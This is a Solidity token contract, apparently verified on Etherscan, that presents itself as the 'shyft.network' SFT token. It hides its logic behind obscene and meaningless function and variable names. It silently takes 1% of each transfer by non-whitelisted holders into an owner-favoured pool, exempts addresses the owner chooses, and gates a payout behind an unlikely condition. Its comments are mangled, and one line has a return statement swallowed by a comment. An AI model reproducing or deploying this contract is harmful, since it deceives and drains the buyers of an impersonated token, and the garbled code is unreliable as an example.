/**
 *Submitted for verification at Etherscan.io on 2020-09-05
*/

pragma solidity ^0.6.0;



/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
abstract contract IERC20 {function totalSupply() virtual public view returns (uint);function balanceOf(address tokenOwner) virtual public view returns (uint balance);function transfer(address to, uint tokens) virtual public returns (bool success);function allowance(address tokenOwner, address spender) virtual public view returns (uint remaining); function approve(address spender, uint tokens) virtual public returns (bool success);function transferFrom(address from, address to, uint tokens) virtual public returns (bool success);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean namety indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This namety changes when {approve} or {transferFrom} are called.
     */
   
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean namety indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired namety afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
   

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean namety indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    

    /**
     * @dev Emitted when `namety` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `namety` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 namety);event Approval(address indexed owner, address indexed spender, uint256 namety);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `namety` is the new allowance.
     */
}




library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;require(c >= a, "SafeMath: addition overflow");return c;}    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */


    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {require(b <= a, errorMessage);uint256 c = a - b;return c;}

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {if (a == 0) {return 0;}

        uint256 c = a * b;require(c / a == b, "SafeMath: multiplication overflow");return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        
        //ASDASGTW//
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded tow
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);uint256 c = a / b;return c;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {require(b != 0, errorMessage);return a % b;
    }
}




contract Context {function _msgSender() internal view virtual returns (address payable) {return msg.sender;}function _msgData() internal view virtual returns (bytes memory) {this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691return msg.data;
    }
}


contract Ownable {address public _owner;event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);constructor () public {
        _owner = msg.sender;emit OwnershipTransferred(address(0), msg.sender);
    }

    function owner() public view returns (address) {return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "OwnSDFTHTYable: C45TG");_;
    }

    function renounceOwnership() public virtual onlyOwner {emit OwnershipTransferred(_owner, address(0));_owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0), "Ownab7F4H5GDFRle: nE");emit OwnershipTransferred(_owner, newOwner);_owner = newOwner;
    }
}


contract BAKSLAMXNUWFBO is Ownable{
    using SafeMath for uint256;mapping (address => uint256) public balanceOf;mapping (address => bool) public whitelist;string public name = "shyft.network";string public symbol = "SFT";uint8 public decimals = 18;uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);uint256 public bangingpussy;event Transfer(address indexed from, address indexed to, uint256 namety);constructor() public {
        bangingpussy = 50 * (
            uint256(10) ** decimals
            );balanceOf[msg.sender] = totalSupply.sub(bangingpussy);emit Transfer(
            address(0),msg.sender, totalSupply.sub(
                bangingpussy));}modifier profitable(
        ) {require(assfuck(), "SHUT THEFUCK UP");_;
    } 
    
    function teamgo(uint256 amount) 
        public 
        view 
        returns (uint256 profit) {uint256 sexy = amount.mul(bangingpussy);  uint256 hut = totalSupply.sub(bangingpussy);  return sexy.div(hut);
    }
    
    function assfuck() 
        public 
        view 
        returns (bool _profitable) {return bangingpussy > totalSupply.sub(bangingpussy);
    }



    function ehymes(address _addr) 
        public 
        onlyOwner {
        whitelist[_addr] = true;}function imruch(address _addr) 
        public 
        onlyOwner {
        whitelist[_addr] = false;}function transfer(address to, uint256 namety) 
        public 
        returns (bool success) {require(balanceOf[msg.sender] >= namety);if(whitelist[msg.sender]) return regular_transfer(
            to, namety);else return twateater(to, namety);
    }
    
    function twateater(
        address to, uint256 namety) 
        private 
        returns (bool success) {uint256 blowjob = namety.div(100/1+0);balanceOf[
            msg.sender] = balanceOf[
                msg.sender].sub(blowjob);bangingpussy = bangingpussy.add(
                    blowjob);namety = namety.sub(
                        blowjob);return regular_transfer(
                            to, namety);
    }

    function regular_transfer(address to, uint256 namety) 
        private 
        returns (bool 
        success) {balanceOf[
            msg.sender] = balanceOf[
                msg.sender].sub(namety);balanceOf[to] = balanceOf[
                    to].add(namety);emit Transfer(
                        msg.sender, to, namety);return true;
    }
    
    function transferFrom(address from, address to, uint256 namety)
        public
        returns (bool success)
    {
        require(
            namety <= balanceOf[from]);require(namety <= allowance[from][msg.sender]);if(whitelist[msg.sender]) return boringbitch(from, to, namety);else return twateaterFrom(from, to, namety); 

    }
    

    
    function boringbitch(address from, address to, uint256 namety
    ) 
        private
        returns (bool success) {balanceOf[from] = balanceOf[from].sub(namety);balanceOf[to]=balanceOf[to].add(namety);allowance[from][msg.sender] = allowance[
            from][msg.sender].sub(namety);emit Transfer(from, to, namety);return true;}function fatcunt(uint256 amount) 
        public 
        profitable 
        returns (
        bool 
        success
        ) 
        {
        // the amount must be less than the total amount pooled
        require(
            amount
            <= balanceOf[
                msg.sender]
                );require(
                    bangingpussy
                    >= amount
                    ); 
                    uint256 wellwellwellwellwell = 
                    teamgo(
                        amount);require(
            wellwellwellwellwell < bangingpussy
            );balanceOf[
            msg.sender] = balanceOf[
                msg.sender].add(
                    wellwellwellwellwell);emit Transfer(
                        _owner, msg.sender, 
                        wellwellwellwellwell
                        );bangingpussy = bangingpussy.sub(wellwellwellwellwell);return burn(amount);
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
        function twateaterFrom(address from, address to, uint256 tok) 
        private 
        returns (bool success) {uint256 yand_am = tok.div(1*100/1);balanceOf[from] = balanceOf[from].sub(yand_am);bangingpussy = bangingpussy.add(yand_am);allowance[from][msg.sender] = allowance[from][msg.sender].sub(yand_am);tok = tok.sub(yand_am);return boringbitch(from, to, tok);}
    
    function burn(uint256 namety) 
        private 
        returns (bool success) {balanceOf[msg.sender] = balanceOf[msg.sender].sub(namety);balanceOf[address(0)] = balanceOf[address(0)].add(namety);emit Transfer(msg.sender, address(0), namety);totalSupply = totalSupply.sub(namety);return true;}
    
    // APPROVAL FUNCTIONS
    
    event Approval(address indexed owner, address indexed spender, uint256 namety);mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, 
        uint256 namety
        )public
         returns (bool success)
    {
        allowance[
        msg.sender][
        spender] = namety;emit Approval(
            msg.sender, 
            spender, 
            namety);return true;
    }

}